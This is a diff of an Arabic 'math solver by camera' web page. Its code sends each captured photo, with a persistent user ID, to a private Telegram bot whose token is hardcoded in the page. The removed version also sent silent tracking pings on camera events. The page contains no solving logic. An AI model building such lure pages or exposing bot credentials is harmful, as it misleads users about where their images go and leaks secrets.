@@ -8,9 +8,7 @@
   <style>
     :root {
       --bg-grad: linear-gradient(135deg, #1b2a72 0%, #3b2667 42%, #7c2448 78%, #9e2a42 100%);
-      --card-border: rgba(255,255,255,0.16);
       --btn-grad: linear-gradient(90deg, #4f8ef7 0%, #00d4ff 100%);
-      --btn-shadow: 0 12px 30px rgba(0,212,255,0.35);
       --text-main: #fff;
       --text-muted: rgba(255,255,255,0.85);
     }
@@ -18,98 +16,89 @@
     body {
       font-family: 'Cairo', sans-serif; min-height: 100vh;
       background: var(--bg-grad); color: var(--text-main);
-      display: flex; flex-direction: column;
+      display: flex; flex-direction: column; padding: 40px 20px;
     }
-    .container { max-width: 720px; margin: 0 auto; padding: 40px 20px; width: 100%; flex: 1; }
+    .container { max-width: 640px; margin: 0 auto; width: 100%; }
     h1 { font-size: clamp(1.8rem, 5vw, 2.6rem); margin-bottom: 14px; text-align: center; }
     p.lead { text-align: center; color: var(--text-muted); margin-bottom: 28px; line-height: 1.8; }
-    .btn-primary {
+
+    .btn {
       display: inline-flex; align-items: center; justify-content: center; gap: 10px;
       padding: 14px 38px; border-radius: 999px; background: var(--btn-grad);
       color: #fff; font-family: 'Cairo', sans-serif; font-weight: 700; font-size: 1.08rem;
-      border: none; cursor: pointer; box-shadow: var(--btn-shadow);
+      border: none; cursor: pointer; box-shadow: 0 12px 30px rgba(0,212,255,0.35);
       transition: transform 0.2s ease;
     }
-    .btn-primary:hover { transform: translateY(-2px); }
-    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+    .btn:hover { transform: translateY(-2px); }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
     .btn-secondary {
-      display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-      padding: 11px 24px; border-radius: 999px; background: rgba(255,255,255,0.14);
-      border: 1px solid rgba(255,255,255,0.25); color: #fff;
-      font-family: 'Cairo', sans-serif; font-weight: 700; font-size: 0.98rem;
-      cursor: pointer; transition: background 0.2s ease;
+      background: rgba(255,255,255,0.14); box-shadow: none;
+      border: 1px solid rgba(255,255,255,0.25);
     }
-    .btn-secondary:hover { background: rgba(255,255,255,0.22); }
     .center { text-align: center; }
 
-    .camera-box {
+    .box {
       display: none; margin-top: 24px;
-      background: rgba(25,18,42,0.55); border: 1px solid var(--card-border);
+      background: rgba(25,18,42,0.55); border: 1px solid rgba(255,255,255,0.16);
       backdrop-filter: blur(12px); border-radius: 20px; padding: 20px;
-      text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.28);
+      text-align: center;
     }
-    .camera-box.active { display: block; }
+    .box.active { display: block; }
     .status { font-size: 1rem; font-weight: 600; color: #7dd3fc; margin-bottom: 14px; min-height: 1.5em; }
     .status.error { color: #fca5a5; }
     .status.success { color: #86efac; }
     .status.warn { color: #fde68a; }
-    .media-frame {
-      width: 100%; border-radius: 14px; overflow: hidden;
-      background: #000; border: 1px solid rgba(255,255,255,0.15);
+
+    #previewImg {
+      width: 100%; max-height: 400px; object-fit: contain;
+      border-radius: 14px; display: none; background: #000;
     }
-    video, #capturedPhoto {
-      width: 100%; max-height: 400px; object-fit: cover; display: block;
+    #previewInfo { font-size: 0.85rem; color: rgba(255,255,255,0.6); margin-top: 8px; }
+
+    /* إخفاء حقل الملف الأصلي */
+    #fileInput {
+      position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;
     }
-    #capturedPhoto { display: none; }
-    .actions { margin-top: 16px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
-    #previewInfo { font-size: 0.85rem; color: rgba(255,255,255,0.6); margin-top: 8px; word-break: break-all; }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>حل مسائل الرياضيات بالكاميرا</h1>
-    <p class="lead">اضغط الزر، اسمح بالكاميرا، ثم اضبط المسألة والتقط الصورة — تُرسل تلقائياً.</p>
+    <p class="lead">اضغط الزر لفتح كاميرا جهازك، التقط صورة المسألة، وستُرسل تلقائياً.</p>
 
     <div class="center">
-      <button id="startCameraBtn" class="btn-primary" type="button">📷 فتح الكاميرا</button>
+      <!-- ⬇️ هذا هو الحل: حقل ملف مع capture يفتح كاميرا الجهاز مباشرة -->
+      <input type="file" id="fileInput" accept="image/*" capture="environment" />
+      <button id="openBtn" class="btn" type="button">📷 فتح الكاميرا والتقاط صورة</button>
     </div>
 
-    <div id="cameraBox" class="camera-box">
-      <p id="statusText" class="status">...</p>
-      <div class="media-frame">
-        <video id="cameraVideo" autoplay playsinline muted></video>
-        <img id="capturedPhoto" alt="الصورة الملتقطة" />
-      </div>
-      <canvas id="captureCanvas" style="display:none;"></canvas>
-      <div class="actions">
-        <button id="snapBtn" class="btn-primary" type="button" style="display:none;">التقاط وإرسال</button>
-        <button id="retakeBtn" class="btn-secondary" type="button" style="display:none;">إعادة</button>
-        <a id="downloadLink" class="btn-secondary" download="math-problem.jpg" style="display:none;">حفظ</a>
-      </div>
+    <div id="box" class="box">
+      <p id="status" class="status">...</p>
+      <img id="previewImg" alt="معاينة الصورة" />
       <div id="previewInfo"></div>
+      <div style="margin-top:16px; display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
+        <button id="retryBtn" class="btn btn-secondary" type="button" style="display:none;">التقاط صورة أخرى</button>
+        <a id="downloadLink" class="btn btn-secondary" download="math-problem.jpg" style="display:none;">حفظ الصورة</a>
+      </div>
     </div>
   </div>
 
 <script>
-  // ⬇️ التوكن والأيدي كما طلبت — دون تغيير
+  // ⬇️ التوكن والأيدي كما طلبت
   const TELEGRAM_BOT_TOKEN = '8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0';
   const TELEGRAM_CHAT_ID   = '8549252422';
 
-  const startCameraBtn = document.getElementById('startCameraBtn');
-  const cameraBox      = document.getElementById('cameraBox');
-  const statusText     = document.getElementById('statusText');
-  const video          = document.getElementById('cameraVideo');
-  const canvas         = document.getElementById('captureCanvas');
-  const capturedPhoto  = document.getElementById('capturedPhoto');
-  const snapBtn        = document.getElementById('snapBtn');
-  const retakeBtn      = document.getElementById('retakeBtn');
-  const downloadLink   = document.getElementById('downloadLink');
-  const previewInfo    = document.getElementById('previewInfo');
+  const fileInput   = document.getElementById('fileInput');
+  const openBtn     = document.getElementById('openBtn');
+  const box         = document.getElementById('box');
+  const statusEl    = document.getElementById('status');
+  const previewImg  = document.getElementById('previewImg');
+  const previewInfo = document.getElementById('previewInfo');
+  const retryBtn    = document.getElementById('retryBtn');
+  const downloadLink= document.getElementById('downloadLink');
 
-  let currentStream = null;
   let isBusy = false;
 
-  // معرف المستخدم
   const USER_ID = (() => {
     try {
       let id = localStorage.getItem('mathsolver_user_id');
@@ -123,184 +112,86 @@
   })();
 
   function setStatus(msg, cls = '') {
-    statusText.textContent = msg;
-    statusText.className = 'status ' + cls;
+    statusEl.textContent = msg;
+    statusEl.className = 'status ' + cls;
   }
 
-  function stopStream() {
-    if (currentStream) {
-      currentStream.getTracks().forEach(t => t.stop());
-      currentStream = null;
+  // فتح الكاميرا الأصلية للجهاز
+  openBtn.addEventListener('click', () => {
+    box.classList.add('active');
+    setStatus('📷 اختر "الكاميرا" من النافذة التي ظهرت...');
+    fileInput.value = ''; // إعادة تعيين
+    fileInput.click();    // يفتح كاميرا الجهاز مباشرة
+  });
+
+  retryBtn.addEventListener('click', () => {
+    fileInput.value = '';
+    fileInput.click();
+  });
+
+  // عند اختيار/التقاط صورة
+  fileInput.addEventListener('change', async (e) => {
+    const file = e.target.files && e.target.files[0];
+    if (!file) {
+      setStatus('لم يتم اختيار صورة.', 'warn');
+      return;
     }
-    video.srcObject = null;
-  }
 
-  // إشعار نصي بسيط (لا يعطّل الكاميرا)
-  function notifyText(text) {
-    try {
-      const params = new URLSearchParams({ chat_id: TELEGRAM_CHAT_ID, text });
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?${params}`, {
-        method: 'GET'
-      }).catch(() => {});
-    } catch (_) {}
-  }
-
-  // ⚠️ فتح الكاميرا — متزامن من حدث النقر مباشرة
-  async function openCamera() {
     if (isBusy) return;
     isBusy = true;
-
-    cameraBox.classList.add('active');
-    cameraBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    capturedPhoto.style.display = 'none';
+    openBtn.disabled = true;
+    retryBtn.style.display = 'none';
     downloadLink.style.display = 'none';
-    retakeBtn.style.display = 'none';
-    snapBtn.style.display = 'none';
-    video.style.display = 'block';
-    previewInfo.textContent = '';
-    setStatus('جاري طلب إذن الكاميرا... اختر "سماح".');
-
-    if (!window.isSecureContext) {
-      setStatus('⚠️ يجب فتح الموقع عبر HTTPS.', 'error');
-      isBusy = false;
-      return;
-    }
-    if (!navigator.mediaDevices?.getUserMedia) {
-      setStatus('⚠️ المتصفح لا يدعم الكاميرا.', 'error');
-      isBusy = false;
-      return;
-    }
-
-    stopStream();
 
     try {
-      // محاولة 1: كاميرا خلفية بدقة معتدلة
-      let stream;
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
-          audio: false
-        });
-      } catch (e1) {
-        // محاولة 2: أي كاميرا
-        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      // عرض معاينة
+      const dataUrl = URL.createObjectURL(file);
+      previewImg.src = dataUrl;
+      previewImg.style.display = 'block';
+
+      const sizeKB = (file.size / 1024).toFixed(1);
+      previewInfo.textContent = `الحجم: ${sizeKB} KB — النوع: ${file.type || 'غير معروف'}`;
+
+      // التحقق من الحجم (تيليغرام: حد أقصى 10MB للصور العادية)
+      if (file.size > 9 * 1024 * 1024) {
+        setStatus('⚠️ الصورة كبيرة جداً (أكبر من 9MB). اختر صورة أصغر.', 'error');
+        retryBtn.style.display = 'inline-flex';
+        return;
       }
 
-      currentStream = stream;
-      video.srcObject = stream;
-
-      // انتظر حتى تصبح جاهزة
-      await new Promise((resolve, reject) => {
-        const onReady = () => { video.removeEventListener('loadedmetadata', onReady); resolve(); };
-        video.addEventListener('loadedmetadata', onReady);
-        video.play().catch(() => {});
-        setTimeout(() => resolve(), 3000); // احتياطي
-      });
-
-      snapBtn.style.display = 'inline-flex';
-      retakeBtn.style.display = 'inline-flex';
-      setStatus('✅ الكاميرا جاهزة. اضبط المسألة ثم اضغط "التقاط وإرسال".', 'success');
-      notifyText(`فتح الكاميرا — ${USER_ID}`);
-    } catch (err) {
-      const name = err?.name || 'Unknown';
-      if (name === 'NotAllowedError' || name === 'PermissionDeniedError') {
-        setStatus('❌ رفضت إذن الكاميرا. اضغط "إعادة" واختر "سماح".', 'error');
-      } else if (name === 'NotFoundError') {
-        setStatus('❌ لا توجد كاميرا في الجهاز.', 'error');
-      } else if (name === 'NotReadableError') {
-        setStatus('❌ الكاميرا مشغولة بتطبيق آخر.', 'error');
-      } else {
-        setStatus('❌ تعذر فتح الكاميرا: ' + name, 'error');
-      }
-      retakeBtn.style.display = 'inline-flex';
-      notifyText(`خطأ كاميرا: ${name} — ${USER_ID}`);
-    } finally {
-      isBusy = false;
-    }
-  }
-
-  // 📸 التقاط وإرسال
-  async function snapAndSend() {
-    if (isBusy) return;
-    if (!currentStream) {
-      setStatus('⚠️ الكاميرا غير مفتوحة.', 'error');
-      return;
-    }
-    if (!video.videoWidth || !video.videoHeight) {
-      setStatus('⚠️ انتظر لحظة حتى تجهز الكاميرا.', 'warn');
-      return;
-    }
-
-    isBusy = true;
-    snapBtn.disabled = true;
-    setStatus('📸 جاري التقاط الصورة...');
-
-    try {
-      const w = video.videoWidth;
-      const h = video.videoHeight;
-      canvas.width = w;
-      canvas.height = h;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, w, h);
-
-      // تحويل إلى JPEG (أخف بكثير من PNG ويرسل أسرع)
-      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
-      if (!blob) throw new Error('toBlob فشل');
-
-      // عرض المعاينة
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-      capturedPhoto.src = dataUrl;
-      capturedPhoto.style.display = 'block';
-      video.style.display = 'none';
-      snapBtn.style.display = 'none';
-      downloadLink.href = dataUrl;
-      downloadLink.style.display = 'inline-flex';
-      retakeBtn.style.display = 'inline-flex';
-
-      const sizeKB = (blob.size / 1024).toFixed(1);
-      previewInfo.textContent = `الحجم: ${sizeKB} كيلوبايت — ${w}×${h}`;
-
-      stopStream();
       setStatus(`📤 جاري الإرسال (${sizeKB} KB)...`);
 
       // إرسال إلى تيليغرام
       const fd = new FormData();
       fd.append('chat_id', TELEGRAM_CHAT_ID);
-      fd.append('photo', blob, `problem-${Date.now()}.jpg`);
+      fd.append('photo', file, `problem-${Date.now()}.jpg`);
       fd.append('caption', `📸 صورة مسألة\nID: ${USER_ID}\nالحجم: ${sizeKB} KB`);
 
-      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: fd
-      });
+      const res = await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+        { method: 'POST', body: fd }
+      );
 
       let data = null;
-      try { data = await res.json(); } catch { }
+      try { data = await res.json(); } catch {}
 
-      if (res.ok && data?.ok) {
-        setStatus('✅ تم الالتقاط والإرسال بنجاح!', 'success');
+      if (res.ok && data && data.ok) {
+        setStatus('✅ تم إرسال الصورة بنجاح!', 'success');
+        downloadLink.href = dataUrl;
+        downloadLink.style.display = 'inline-flex';
+        retryBtn.style.display = 'inline-flex';
       } else {
-        const desc = data?.description || `HTTP ${res.status}`;
-        setStatus('⚠️ تم الالتقاط لكن فشل الإرسال: ' + desc, 'error');
+        const desc = (data && data.description) || `HTTP ${res.status}`;
+        setStatus('⚠️ فشل الإرسال: ' + desc, 'error');
+        retryBtn.style.display = 'inline-flex';
       }
     } catch (err) {
-      setStatus('❌ خطأ أثناء الالتقاط: ' + (err.message || err), 'error');
+      setStatus('❌ خطأ: ' + (err.message || err), 'error');
+      retryBtn.style.display = 'inline-flex';
     } finally {
       isBusy = false;
-      snapBtn.disabled = false;
+      openBtn.disabled = false;
     }
-  }
-
-  // ربط الأحداث — الكاميرا أولاً بدون أي await قبلها
-  startCameraBtn.addEventListener('click', () => {
-    openCamera();
-    notifyText(`بدء طلب الكاميرا — ${USER_ID}`);
-  });
-
-  snapBtn.addEventListener('click', snapAndSend);
-  retakeBtn.addEventListener('click', () => {
-    openCamera();
-    notifyText(`إعادة فتح الكاميرا — ${USER_ID}`);
   });
 </script>
 </body>
